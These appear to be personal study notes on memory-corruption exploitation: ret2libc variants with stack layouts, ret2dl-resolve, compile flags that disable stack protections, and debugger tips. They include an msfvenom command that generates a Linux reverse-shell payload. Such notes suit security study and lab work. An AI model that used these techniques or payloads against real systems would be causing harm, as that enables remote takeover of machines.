## A few techniques
* In case a function is in an ASCII Armored Address Space, return to the PLT's
  entry address of that function.

  Limitation: the function must be used in the binary (have a PLT entry)
* ret2reg: use an address contained in a register and search for call instructions with that register

### ret2libc
* ret2libc targets: `system()` on Linux, `WinExec(), LoadLibraryA()` on Windows
* Limitation of ret2libc: injecting NULL bytes

#### ret2strcpy
* Particular case of ret2libc
* Works with functions that can copy memory blocks:
  `strcpy(), sprintf(), memcpy()...`
* Goal: return to `strcpy()` to copy code on an NX stack to a location with
  the X bit set.
* Stack layout:

```
(lower addresses)

&strcpy()   ; Address of strcpy() function
dest_ret    ; Where to go after the copy
dest        ; Executable location
src         ; Injected code address

(higher addresses)
```

#### ret2gets
* Particular case of ret2libc. Similar to ret2strcpy
* Works with functions that receive input:
  `gets(), read(), recv(), recvfrom()...`
* Stack layout:

```
(lower addresses)

&gets()     ; Address of gets() function
dest_ret    ; Where to go after
dest        ; Executable location

(higher addresses)
```

## ret2dl-resolve
* Return into the ELF's dynamic linker's resolver (*ld.so*) to return to
  functions in the PLT that are not used in the binary



## Tools
* [Custom tools](https://github.com/greglan/sec-tools)
* [Exploit wrapper in C](https://github.com/greglan/sec-tools/blob/master/shellcode_wrapper.c)
* [Bash script](https://github.com/greglan/sec-tools/blob/master/try_exploit.sh)
* View instructions encoding of binary: `objdump -D -b binary -m i386 -M intel filename.bin`
* Memory map in file: `/proc/$PID/maps`
* Check the stack flags: `readelf -l prog_name | grep GNU_STACK`
* List available payloads: `msfvenom -l payloads`
* Show options of a sepcific payload: `msfvenom -p linux/x64/shell_reverse_tcp --payload-options`
* Generation of a payload:

```
msfvenom -p linux/x64/shell_reverse_tcp \ # Specify the payload
            LHOST=127.0.0.1             \ # Parameter from the payload's options
            LPORT=4444                  \ # Parameter from the payload's options
         -b '\x00'                      \ # Test for undesired bytes
         -f python                        # Output format of the payload
```

### Compilation flags
* Enable GDB debugging symbols (gcc): `-ggdb`
* Compile for 32bit systems (gcc): `-m32`
* Disable stack smashing protection (gcc): `-fno-stack-protector`
* Allow stack execution (gcc): `-z execstack`
* Force 32 bits executables (ld): `-m elf_i386`


## Exploitation outside of a debugger
* Have exactly the same environment variables, otherwise the stack is shifted. Most notably, remove the `LINES` and `COLUMNS` variables in GDB
* Start the binary from the same directory, else some envar may change (`PWD, OLDPWD`)
* Use existing envar and try to keep the length the same
* Start the debugger and program using the absolute path

### Fixing addresses
* Get addresses of buffers: `ltrace prog_name`
* Return to `printf` so that we get an output of what is the target. Then fix the addresses by trial and error [1]
